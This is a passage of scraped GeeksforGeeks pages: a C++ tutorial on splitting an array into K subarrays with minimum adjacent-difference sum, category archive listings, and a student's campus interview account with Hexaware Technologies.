12}, K = 3Output: 24Explanation: Splitting array into following 3 subarrays: {2, 14}, {26}, {10, 5, 12}. Approach: The given problem can be solved based on the following observations: The idea is to slice the array arr[] at ith index which gives maximum absolute difference of adjacent elements. Subtract it from the result. Slicing at K – 1 places will give K subarrays with minimum sum of absolute difference of adjacent elements. Follow the steps below to solve the problem: Initialize an array, say new_Arr[], and an integer variable, say ans, to store total absolute difference sum. Traverse the array . Store absolute difference of adjacent elements, say arr[i+1] and arr[i] in new_Arr[] array. Increment ans by absolute difference of arr[i] and arr[i + 1] Sort the new_Arr[] array in descending order. Traverse the array from i = 0 to i = K-1 Decrement ans by new_Arr[i]. Finally, print ans. Below is the implementation of the above approach: C++ filter_none edit close play_arrow link brightness_4 code // C++ program for the above approach #include <bits/stdc++.h> using namespace std; // Function to split an array into K subarrays // with minimum sum of absolute difference // of adjacent elements in each of K subarrays void absoluteDifference(int arr[], int N, int K) { // Stores the absolute differences // of adjacent elements int new_Arr[N - 1]; // Stores the answer int ans = 0; // Stores absolute differences of // adjacent elements in new_Arr for (int i = 0; i < N - 1; i++) { new_Arr[i] = abs(arr[i] - arr[i + 1]); // Stores the sum of all absolute // differences of adjacent elements ans += new_Arr[i]; } // Sorting the new_Arr // in decreasing order sort(new_Arr, new_Arr + N - 1, greater<int>()); for (int i = 0; i < K - 1; i++) { // Removing K - 1 elements // with maximum sum ans -= new_Arr[i]; } // Prints the answer cout << ans << endl; } // Driver code int main() { // Given array arr[] int arr[] = { 1, 3, -2, 5, -1 }; // Given K int K = 2; // Size of array int N = sizeof(arr) / sizeof(arr[0]); // Function Call absoluteDifference(arr, N, K); return 0; } chevron_right filter_none Output: 13 Time Complexity: O(N * Log(N))Auxiliary Space: O(N) Attention reader! Don’t stop learning now. Get hold of all the important DSA concepts with the DSA Self Paced Course at a student-friendly price and become industry ready. My Personal Notes arrow_drop_up Save Recommended Posts:Split a given array into K subarrays minimizing the difference between their maximum and minimumSplit array into two subarrays such that difference of their sum is minimumMaximise sum of absolute difference between adjacent elements in Array with sum KSplit array into subarrays at minimum cost by minimizing count of repeating elements in each subarraySplit array into two subarrays such that difference of their maximum is minimumSplit first N natural numbers into two sets with minimum absolute difference of their sumsSplit squares of first N natural numbers into two sets with minimum absolute difference of their sumsCount ways to split array into two equal sum subarrays by changing sign of any one array elementCount ways to split array into two equal sum subarrays by replacing each array element to 0 onceSplit array into minimum number of subarrays having GCD of its first and last element exceeding 1Minimum index to split array into subarrays with co-prime productsMissing occurrences of a number in an array such that maximum absolute difference of adjacent elements is minimumMinimum absolute difference of adjacent elements in a circular arraySplit an array into two equal Sum subarraysSplit array into K disjoint subarrays such that sum of each subarray is odd.Count of ways to split an Array into three contiguous Subarrays having increasing SumSort elements of an array in increasing order of absolute difference of adjacent elementsDivide Matrix into K groups of adjacent cells having minimum difference between maximum and minimum sized groupsArrange first N natural numbers such that absolute difference between all adjacent elements > 1Check if an array can be split into subarrays with GCD exceeding Knk14646Check out this Author's contributed articles.If you like GeeksforGeeks and would like to contribute, you can also write an article using contribute.geeksforgeeks.org or mail your article to contribute@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please Improve this article if you find anything incorrect by clicking on the "Improve Article" button below. Article Tags : ArraysMathematicalSortingarray-rearrangesubarray Practice Tags : ArraysMathematicalSorting thumb_up Be the First to upvote. To-do Done 0 No votes yet. Please write to us at contribute@geeksforgeeks.org to report any issue with the above content. Post navigation Previous first_page Print path from a node to root of given Complete Binary Tree Next last_page Make all array elements even by replacing adjacent pair of array elements with their sum Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most popular in Arrays Maximum and minimum of an array using minimum number of comparisonsProgram to find largest element in an arrayRemove duplicates from sorted arrayFind Second largest element in an arrayFind duplicates in O(n) time and O(1) extra space | Set 1 Most visited in Mathematical Program for Fibonacci numbersC++ Data TypesProgram for factorial of a numberSet in C++ Standard Template Library (STL)Write a program to print all permutations of a given string room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Sorting Archives - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Merge SortQuickSortBubble SortInsertion SortSelection SortHeapSortstd::sort() in C++ STLSort elements by frequency | Set 1Count Inversions in an array | Set 1 (Using Merge Sort)Time Complexities of all Sorting AlgorithmsRadix SortCounting SortMerge Sort for Linked ListsSort an array of 0s, 1s and 2sk largest(or smallest) elements in an array | added Min Heap methodPython list sort()Merge two sorted arraysMinimum number of swaps required to sort an arraySorting Vector of Pairs in C++ | Set 1 (Sort by first and second)Find a triplet that sum to a given valueMerge two sorted arrays with O(1) extra spaceMerge k sorted arrays | Set 1Sort string of charactersBucket SortSort a nearly sorted (or K sorted) arrayPython Program for Bubble SortShellSortSort elements by frequency | Set 1Longest Consecutive SubsequenceStability in sorting algorithms Category Archives: Sorting Split array into K subarrays with minimum sum of absolute difference between adjacent elements Last Updated: 21-12-2020 Given an array, arr[] of size N and an integer K, the task is to split the array into K subarrays minimizing the sum of… Read More » ArraysMathematicalSortingarray-rearrangesubarray Queries to check if sweets of given type can be eaten on given day or not Last Updated: 19-12-2020 5 Given two arrays A[ ] and B[ ] consisting of N integers, where Ai denotes the quantity of sweets of the ith type and Bi… Read More » ArraysGreedyMathematicalSortingarray-range-queriescpp-paircpp-vector Count pairs (i, j) from given array such that i K * arr[j] Last Updated: 18-12-2020 Given an array arr[] of length N and an integer K, the task is to count the number of pairs (i, j) such that i… Read More » ArraysDivide and ConquerMathematicalSortingMerge Sortpartitionsubarray Lexicographically largest string possible by reversing substrings having even number of 1s Last Updated: 17-12-2020 2 Given a binary string S, the task is to convert the given string S to its lexicographic maximum form by reversing substrings having an even… Read More » SearchingSortingStringslexicographic-orderingstringssubstring Selection Sort VS Bubble Sort Last Updated: 17-12-2020 In this, we will cover the comparison between Selection Sort VS Bubble Sort. The resources required by Selection Sort & Bubble Sort algorithms on the… Read More » AlgorithmsC++Difference BetweenSortingBubbleSortselection-sort Count maximum possible pairs from an array having sum K Last Updated: 21-12-2020 Given an array arr[] consisting of N integers and an integer K, the task is to find the maximum number of pairs having sum K… Read More » ArraysHashSearchingSortingHashTabletwo-pointer-algorithm Print all array elements appearing more than N / K times Last Updated: 15-12-2020 Given an array arr[] of size N and an integer K, the task is to find all the array elements that appear more than (N… Read More » ArraysC++ ProgramsDivide and ConquerGreedyHashSortingArraysBinary Searchcpp-map Check if all K-length subset sums of first array greater than that of the second array Last Updated: 18-12-2020 Given two arrays A[] and B[] of size N and an integer K, the task is to check if all possible subset-sums of subsets of… Read More » ArraysGreedyMathematicalSortingsubset K-th Smallest Element in an Unsorted Array using Priority Queue Last Updated: 14-12-2020 Given an array arr[] consisitng of N integers and an integer K, the task is to find the Kth smallest element in the array using… Read More » ArraysHeapQueueSortingcpp-priority-queuecpp-vectorHeap Sort Sort M elements of given circular array starting from index K Last Updated: 18-12-2020 Given a circular array arr[] of size N and two integers K and M, the task is to sort M array elements starting from the… Read More » ArraysGreedyMathematicalSortingcircular-array Count rotations required to sort given array in non-increasing order Last Updated: 15-12-2020 Given an array arr[] consisting of N integers, the task is to sort the array in non-increasing order by minimum number of anti-clockwise rotations. If… Read More » ArraysSearchingSortingrotation Largest element in the longest Subarray consisting of only Even or only Odd numbers Last Updated: 10-12-2020 Given an array arr[] of size N, the task is to find the largest element in the longest subarray consisting only of even numbers or… Read More » ArraysMathematicalSearchingSortingsubarray Check if a string consists of two K-length non-overlapping substrings as anagrams Last Updated: 17-12-2020 Given a string str of length N and an integer K, the task is to check if a string has two non-overlapping substrings of length… Read More » HashSortingStringsanagramcpp-unordered_setHashSet Maximize count of persons receiving a chocolate Last Updated: 14-12-2020 Given two arrays A[], consisting of N integers, and B[], consisting of taste values of M chocolates and an integer X, the task is to… Read More » ArraysGreedySearchingSortingBinary Searchcpp-multiset Median of Stream of Running Integers using STL | Set 2 Last Updated: 08-12-2020 Given an array arr[] of size N representing integers required to be read as a data stream, the task is to calculate and print the… Read More » ArraysMathematicalSortingarray-streammedian-findingSTL Page 1 of 7012345...102030...»Last » Most popular in Sorting sort() in PythonComparison among Bubble Sort, Selection Sort and Insertion SortQuick Sort vs Merge SortSort a stack using a temporary stackPython Program for QuickSort Most Visited in Sorting Sorting a Map by value in C++ STLFind whether an array is subset of another array | Added Method 5Most frequent element in an arrayEfficiently merging two sorted arrays with O(1) extra spaceCheck if two arrays are equal or not room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Hexaware Technologies Interview Experience - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Internship Interview Experiences Company-WiseAmazon Interview QuestionsCommonly Asked Java Programming Interview Questions | Set 2How I cracked TCS DigitalMicrosoft's most asked interview questionsTCS NQT Coding Questions & How Coding Task Evaluated in TCS NQTDirecti Interview | Set 7 (Programming Questions)TCS Digital Interview QuestionsGoogle Interview QuestionsAmazon Recruitment ProcessGoogle Online Challenge 2020How to write an Interview Experience?Zoho Interview | Set 3 (Off-Campus)Amazon SDE-1 Interview Experience | Amazon WOW-2020Adobe Interview Experience | SHECODES-Software EngineerJP Morgan Chase & Co. (JPMC) Interview Experience | (Full time Software Engineer)NCR Corporation (On-Campus Recruitment Drive)Accenture On Campus 2020 Placement DriveGoldman Sachs Interview Experience | Set 33 (For Experienced)Cognizant Interview Experience | Set 2 (On-Campus)Accenture Campus Placement Drive 2020TCS Ninja Interview Experience and Interview QuestionsCapgemini Virtual Hiring (New process) | 2021 BatchAccenture Interview Experience | Set 1 (On-Campus)Adobe Interview | Set 13 (On Campus for Internship)Amazon Interview | Set 44 (For Internship)ZS Associates Interview Experience | Set 1 (Technology Analyst - On Campus)Cognizant Interview Experience - Programmer Analyst TraineeTCS Interview Experience | Set 1 (On-Campus 2014)MathWorks Interview Experience (EDG, Oncampus) Hexaware Technologies Interview Experience Last Updated: 21-12-2020 This was the first time that Hexaware technologies were conducting its selection process in the North. It was for the position for PGET and the joining location was Chennai with a bond of 3 years. The selection process took place on our campus in GEU, Dehradun and it was a two-day process(9-10 October 2019). Round 1(Online test): There were 2 sections. Aptitude + Reasoning, the questions were easy in this round. Domain-based questions, Data Structure, Networking. Based on your combined score in both sections, you can get selected in this round. Round 2(Coding Test): It actually took place in 2 groups. I was in the first group, and we had to do 2 questions in 60 mins and they were quite easy if you’ve basic knowledge of programming. But the questions of the second group were a bit tough and were based on sorting algorithms. Round 3(Listening, Reading, Writing, and speaking): It was conducted on the software installed on a few computers and laptops. It was an hour-long test. Basically, it tested our ability to speak, write, and read the English language. To be able to sit for further rounds a minimum of 58% was to be achieved. Round 4(Behavioral Test): It wasn’t an elimination round but questions were asked in the HR round based on this test. Round 5(Technical Interview-1): The interviewer asked me for my introduction. I mentioned my projects then he asked questions related to my project. Why did you use Tensorflow and not Keras? Why did you choose this project? What was the accuracy achieved and how could you make it better. Questions related to other projects Next, he started asking me questions about the domain Gave me questions and asked me to write codes in Java. (and was questioning why I wrote that) Write code for JDBC connectivity MySQL queries related to join cross join, etc What are the layers of OSI model, their functionalities, how is data transferred, other network related questions Some basics of C/C++, OOPS concept, virtual function, friend function Operating system basics It lasted for 30-40 mins approx. I was able to clear this round Round 6(Technical Interview-2): It was more based on modern technology knowledge. And clearly if you don’t know the answer to any question just politely tell the interviewer about it. He asked me about the technology I’m interested in. A few questions about my project. Bitcoins and new emerging technologies. It was more of a discussion at this point I was able to clear this round as well Round 7(HR Interview): We all were exhausted at this time because it was 1:00 am. He firmly said that “you know this is not an elimination round so don’t hesitate to answer”. Questions related to answers marked by me in the behavioral test. My hobbies and I mentioned my public journal so asked me questions related to that. What are your future plans related to further studies? Do you have any Location constraints? It lasted for 30 mins. The process was over then. We got our results in a week, and I was selected. Always remember to be thorough with the concepts and be honest, if you don’t know the answer say no instead of trying to fool them. Write your Interview Experience or mail it to contribute@geeksforgeeks.org My Personal Notes arrow_drop_up Save Recommended Posts:Hexaware Technologies Interview Experience | Set 1 (Fresher)Hexaware Technologies Interview Experience 2021Hexaware Interview Experience (On-Campus)Hexaware Interview Experience (Off-Campus)Hexaware Interview ExperiencePaxcel Technologies Interview ExperiencePaxcel Technologies Interview Experience | Set 2Interview Experience at Compro Technologies, DelhiInterview Experience with Spire TechnologiesTinyOwl Technologies Interview Experience | Set 1 (On-Campus)Volante Technologies Interview ExperienceMallow Technologies Interview Experience | Set 1 (On-Campus)Edifecs Technologies Interview Experience | Set 1(On-Campus)Streamoid Technologies Interview Experience | Set 1 (For Freshers)Compro Technologies Interview ExperienceHashedIn Technologies Interview Experience | Set (On-Campus)Zebra Technologies Interview Experience | Set 1 (For Internship)Meeami Technologies Interview Experience | Set 1 (On-Campus)Wipro Technologies Interview Experience | Set 15 (For project engineer)Infoview Technologies (IVTL) Interview Experience | Set 1 (Pool Drive)aarushi_bagriCheck out this Author's contributed articles.If you like GeeksforGeeks and would like to contribute, you can also write an article using contribute.geeksforgeeks.org or mail your article to contribute@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please Improve this article if you find anything incorrect by clicking on the "Improve Article" button below. Article Tags : Interview ExperiencesHexaware Technologies thumb_up Be the First to upvote. To-do Done 0 No votes yet. Please write to us at contribute@geeksforgeeks.org to report any issue with the above content. Post navigation Previous first_page VMWare Interview Experience | On-Campus 2020 (Virtual) Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most popular in Interview Experiences Josh Technology Group Interview Experience for SD (On-Campus)Accenture Interview Experience (On-Campus)Amazon Interview Experience for System Development Engineer (On-Campus Dec 2020)Josh Technology Interview Experience | MCQ Online questionsJosh Technology Group Recruitment Process | Pool Drive More related articles in Interview Experiences Cognizant Interview Experience for GenC (On-Campus)Accenture Interview Experience (On-Campus 2021)Udaan Interview ExperienceIntuit Interview Experience | On-Campus InternshipHashedIn Interview Experience (On-Campus 2020) room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Interview Experiences Archives - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Internship Interview Experiences Company-WiseAmazon Interview QuestionsCommonly Asked Java Programming Interview Questions | Set 2How I cracked TCS DigitalMicrosoft's most asked interview questionsTCS NQT Coding Questions & How Coding Task Evaluated in TCS NQTDirecti Interview | Set 7 (Programming Questions)TCS Digital Interview QuestionsGoogle Interview QuestionsAmazon Recruitment ProcessGoogle Online Challenge 2020How to write an Interview Experience?Zoho Interview | Set 3 (Off-Campus)Amazon SDE-1 Interview Experience | Amazon WOW-2020Adobe Interview Experience | SHECODES-Software EngineerJP Morgan Chase & Co. (JPMC) Interview Experience | (Full time Software Engineer)NCR Corporation (On-Campus Recruitment Drive)Accenture On Campus 2020 Placement DriveGoldman Sachs Interview Experience | Set 33 (For Experienced)Cognizant Interview Experience | Set 2 (On-Campus)Accenture Campus Placement Drive 2020TCS Ninja Interview Experience and Interview QuestionsCapgemini Virtual Hiring (New process) | 2021 BatchAccenture Interview Experience | Set 1 (On-Campus)Adobe Interview | Set 13 (On Campus for Internship)Amazon Interview | Set 44 (For Internship)ZS Associates Interview Experience | Set 1 (Technology Analyst - On Campus)Cognizant Interview Experience - Programmer Analyst TraineeTCS Interview Experience | Set 1 (On-Campus 2014)MathWorks Interview Experience (EDG, Oncampus) Category Archives: Interview Experiences Hexaware Technologies Interview Experience Last Updated: 21-12-2020 This was the first time that Hexaware technologies were conducting its selection process in the North. It was for the position for PGET and the… Read More » Interview ExperiencesHexaware Technologies VMWare Interview Experience | On-Campus 2020 (Virtual) Last Updated: 21-12-2020 VMware came to my college for Internship and Internship + Placement offers. The eligible branches for the process were CS and IT. The virtual hiring… Read More » InternshipInterview ExperiencesOn-CampusVMWare Bank of America Interview Experience | On-Campus 2020 Last Updated: 21-12-2020 Bank of America visited our campus for the post of Senior Tech Associate, at five different locations for the full-time offer. There was a total… Read More » Interview ExperiencesBank of AmericaOn-Campus Expedia Internship Interview Experience (On-Campus) Last Updated: 21-12-2020 Expedia visited our college to hire students for FTE(2020 passed outs) and internship(2021 passed outs) in September 2019. I am a 2021 pass out. Round… Read More » InternshipInterview ExperiencesExpediaOn-Campus American Express Interview Experience for FTE | On-Campus 2020 Last Updated: 21-12-2020 American Express visited our campus on 23rd August 2020 for the position of Software Engineer Trainee at Gurgaon/Bangalore Location. There were 3 rounds for selection… Read More » Interview ExperiencesAmerican ExpressOn-Campus NCR Corporation Interview Experience for SDE (On-Campus) Last Updated: 21-12-2020 It consists of five rounds. Written, 2 technical, Managerial, and HR. Round 1(Written Test and Coding): It consists of 33 multiple choices and 2 coding… Read More » Interview ExperiencesNCR CorporationOn-Campus MoneyTap Interview Experience (On-Campus 2020) Last Updated: 21-12-2020 Round 1(Assessment Test): This was the first test. In this round, there were a total of 14 MCQ and 4 Coding Questions. MCQ question… Read More » Interview ExperiencesMoneyTapOn-Campus Blogvault Interview Experience (On-Campus 2020) Last Updated: 21-12-2020 Round 1: It happened in Dec 2020. Online coding round of 2 hours on Interviewbit platform, and three questions. Students who completed 2 questions or… Read More » Interview ExperiencesBlogvaultOn-Campus Cognizant Interview Experience for GenC (On-Campus) Last Updated: 21-12-2020 Cognizant is hiring this year through an on-campus drive for selected colleges, this year due to COVID the hiring process is online. According to a… Read More » Interview ExperiencesCognizantOn-Campus Swiggy Interview Experience for SDE-1 (Bangalore 1.5 Years Experienced) Last Updated: 21-12-2020 Online Coding Test (Hackerrank): Questions were of Easy, Medium, and Hard level, 4 questions in total you need to solve in 1.5 hrs. Round 1(On-site,… Read More » ExperiencedInterview ExperiencesSwiggy ABB Interview Experience (Placement 2020) Last Updated: 21-12-2020 I participated in the placement drive of ABB recently for the post of Software Engineer. (Time frame is given below for reference) It was a… Read More » ExperiencedInterview ExperiencesABB Group Infosys SES Interview Experience | HackWithInfy 2020 Last Updated: 21-12-2020 Infosys conducts Hack With Infy challenge every year across the country. We can get placed in Infosys if we give a decent performance. Platform: Hacker… Read More » Interview ExperiencesHackWithInfyInfosysInfosys-interview-experience Fasal Interview Experience for Product Engineering Internship (6 Months) | Off-Campus 2021 Last Updated: 21-12-2020 Recently I interviewed with Fasal for 6 months internship as a Product Engineering Intern. I applied to Fasal through Linkedin and was fortunate enough to… Read More » InternshipInterview ExperiencesFasalOff-Campus TCS NQT Digital Interview Experience 2020 Last Updated: 20-12-2020 Round 1: TCS conducted the first round of NQT on 28th Oct 2020. The test was conducted on the TCS ion platform. There were questions… Read More » Interview ExperiencesTCSTCS-interview-experience Amazon Interview Experience for System Development Engineer (On-Campus Dec 2020) Last Updated: 19-12-2020 Round 1(Mettl 1 Hr 30 Mins): The assessment consisted of 9 components like software testing, SQL/database, algorithms, Linux, pseudo code, data structures, coding, and networks. … Read More » Interview ExperiencesAmazonOn-Campus Page 1 of 38312345...102030...»Last » Most popular in Interview Experiences Cognizant Interview Experience for GenC (On-Campus)Amazon Interview Experience for System Development Engineer (On-Campus Dec 2020)HashedIn Interview Experience (On-Campus 2020)Meesho Interview ExperienceAvalara Technologies Interview Experience for FTE SDE | On-Campus Most Visited in Interview Experiences Accenture Interview Experience (On-Campus)Google Interview Experience for Software Engineer 2021 New GradJosh Technology Group Interview Experience for SD (On-Campus)Udaan Interview ExperienceAmazon Interview Experience for SDE-Intern | On-Campus 2021 room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Hexaware Technologies Archives - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Hexaware Technologies Interview Experience | Set 1 (Fresher)Hexaware Interview Experience (On-Campus)Hexaware Interview Experience (Off-Campus)Hexaware Interview ExperienceHexaware Technologies Interview Experience 2021Hexaware Technologies Interview Experience Tag Archives: Hexaware Technologies Hexaware Technologies Interview Experience Last Updated: 21-12-2020 This was the first time that Hexaware technologies were conducting its selection process in the North. It was for the position for PGET and the… Read More » Interview ExperiencesHexaware Technologies Hexaware Technologies Interview Experience 2021 Last Updated: 09-12-2020 I got to know about Hexaware Virtual Drive from FirstNaukri. I applied for it online on 18th August 2020. There were several rounds in the… Read More » Interview ExperiencesHexaware Technologies Hexaware Interview Experience Last Updated: 05-11-2020 I got to know that Hexaware is starting there hiring from October 2020, I applied for that drive and there are total 4 rounds for… Read More » Interview ExperiencesHexaware Technologies Hexaware Interview Experience (Off-Campus) Last Updated: 28-10-2020 My interview consisted of 4 rounds Written Round: It consists of 78 questions of 1 mark each. There were around 5 to 6 sections which… Read More » Interview ExperiencesHexaware TechnologiesOff-Campus Hexaware Interview Experience (On-Campus) Last Updated: 30-05-2019 Written Test: It was conducted on CoCubes, There were 2 sections- 1. Aptitude + Reasoning, the questions were easy in this round. 2. Domain based… Read More » Interview ExperiencesHexaware TechnologiesOn-Campus Hexaware Technologies Interview Experience | Set 1 (Fresher) Last Updated: 12-05-2018 Hi, This is my personal experience in the recruitment process of hexaware tech one of the real good place to start IT career as a… Read More » Interview 